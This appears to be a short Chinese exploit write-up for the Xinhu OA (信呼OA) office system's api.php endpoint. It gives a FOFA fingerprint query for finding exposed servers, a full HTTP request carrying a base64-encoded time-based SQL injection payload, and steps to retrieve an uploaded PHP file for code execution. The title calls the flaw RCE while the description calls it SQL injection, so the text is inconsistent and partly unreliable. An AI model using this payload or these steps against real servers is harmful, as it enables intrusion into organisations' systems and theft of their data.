# 信呼OA办公系统后台api.php接口存在RCE

信呼OA办公系统是一个开源的在线办公系统。 信呼OA办公系统uploadAction存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

## fofa

```java
icon_hash="1652488516"
```

## 第一步

```javascript
GET /xhoa/api.php?a=getmfilv&m=upload|api&d=task&fileid=1&fname=MScgYW5kIHNsZWVwKDYpIw== HTTP/1.1  
Host:  
sec-ch-ua: "Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"  
Sec-Fetch-Dest: empty  
Accept: application/json, text/javascript, */*; q=0.01  
Referer: http://127.0.0.1:81/xhoa/  
Cookie:   
Sec-Fetch-Mode: cors  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36  
Accept-Encoding: gzip, deflate, br, zstd  
Sec-Fetch-Site: same-origin  
Accept-Language: zh-CN,zh;q=0.9  
X-Requested-With: XMLHttpRequest  
sec-ch-ua-mobile: ?0  
sec-ch-ua-platform: "Windows"  
```

![image](https://github.com/user-attachments/assets/0f95005f-8c4f-45a0-bed2-eba493c7b87a)

## 第二步

```javascript
访问：http://xxxx/api.php?a=getmfilv&m=upload|api&d=task&fileid=返回的id值
```

![image](https://github.com/user-attachments/assets/ba6f7a2e-8c59-4c08-a87f-8f778d2ee1c4)

## 第三步
```
通过前面第二步获取的地址直接访问即可
http://localhost/upload/2025-03/26_rocktpl5661_1363.php
```

